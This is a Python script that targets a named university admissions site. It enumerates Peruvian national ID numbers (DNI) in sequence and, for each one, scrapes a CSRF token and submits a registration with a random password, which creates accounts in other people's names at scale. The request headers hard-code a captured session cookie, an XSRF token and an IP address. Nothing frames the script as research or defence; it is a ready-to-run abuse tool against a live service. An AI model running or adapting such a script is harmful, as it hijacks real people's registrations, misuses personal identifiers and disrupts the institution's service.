from bs4 import BeautifulSoup
import requests
import random

headers = {
    "Origin":"http://www.inscripciones.uni.edu.pe",
    "Upgrade-Insecure-Requests":"1",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
    "X-DevTools-Emulate-Network-Conditions-Client-Id":"(FE23C8C9001DAF63DA9AF5D5A0597195)",
    "Referer":"http://www.inscripciones.uni.edu.pe/register",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded",
    "Accept-Language":"es-ES,es;q=0.9,en;q=0.8",
    "Cookie":"_ga=GA1.3.1631005714.1515085237; _gid=GA1.3.994182812.1515085237; ssupp.vid=BGJCMWORyXKjwI1OlC1vwRIeDS6mnWNYWQ05251404012018; ssupp.animbnr=false; ssupp.geoloc=%7B%22ipAddress%22%3A%22181.64.142.231%22%2C%22countryCode%22%3A%22PE%22%2C%22country%22%3A%22Peru%22%2C%22region%22%3Anull%2C%22city%22%3Anull%7D; ssupp.chatid=meMhgDjjI1hLbNLQloY4VVQm5zyOOPAe; XSRF-TOKEN=eyJpdiI6IllHQW5BdnJUajNhUENnZllBMXUxOGc9PSIsInZhbHVlIjoidXVodllTU0xxV3I0eFJHSGFNejBZUmRJWU1wTmdKcHBXK2Ntb0s0MGRjZ1wveGlVVkN0Nm12R0xVS0I3WFFQd0pxMUZmUWswYjZvbnpsd051Q2xFWXdBPT0iLCJtYWMiOiI0MTk4NzUwNDk5NDk4NWZmMTQxM2E4ZDQ5NGZiM2JjNjkyMzk2Y2QwODI3OGM2YzY1NDJiMGUzODc1OTk4MWJmIn0%3D; laravel_session=eyJpdiI6IktYXC9WVDlmRDI2YVhHXC9QQU9lamd3QT09IiwidmFsdWUiOiJFYkIxWng0UkxkYkJKWitMdkFFamg1RitTQTIrVzY4U3FYQ0tkZmVuekVteUVFRUd2NFR0ZWI0dTZaS1pJdWlwOU53Mk5ITzJmQVFOVEorc1IrUFROdz09IiwibWFjIjoiNjQwYmRhNmQ1NWFkZjc1MzRlMWFlNDM2NzZhYzg1ZTZkZDgwNGFiNWUxOGJhYzFiNjRiN2ViZTQzMDU3MmRmMCJ9"
}

dni = 10000100
while dni<=99999999 :
    r = requests.get("http://www.inscripciones.uni.edu.pe/login");
    text = r.text
    soup = BeautifulSoup(text , features = "lxml").body
    token = soup.find_all('input')[0]['value']
    dni_str = str(dni)
    password = str(random.randint(100000,999999))
    data = {
        '_token':token,
        'dni': dni_str,
        'password': password,
        'password_confirmation': password
    }
    r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers = headers)
    print(r)
    print(data)
    dni+=1
